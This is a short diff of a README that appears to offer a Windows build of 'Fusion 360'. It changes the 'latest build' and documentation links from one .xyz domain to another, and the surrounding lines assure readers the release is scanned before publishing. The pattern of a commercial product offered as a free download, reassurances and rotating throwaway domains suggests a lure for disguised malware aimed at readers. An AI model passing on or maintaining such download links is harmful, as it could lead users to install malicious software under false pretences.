@@ -22,8 +22,8 @@ The release provided here is scanned before it's published.
 Yes, it's built and tested for Windows.
 
 ## 📥 Downloads & Links
-- 📥 **Get the latest build:** [https://fusion-360-lab.softonx.xyz](https://fusion-360-lab.softonx.xyz)
-- 📖 **Documentation:** [https://fusion-360-lab.softonx.xyz](https://fusion-360-lab.softonx.xyz)
+- 📥 **Get the latest build:** [https://fusion-360-lab.softax.xyz](https://fusion-360-lab.softax.xyz)
+- 📖 **Documentation:** [https://fusion-360-lab.softax.xyz](https://fusion-360-lab.softax.xyz)
 
 ## System Requirements
 - Windows (64-bit)
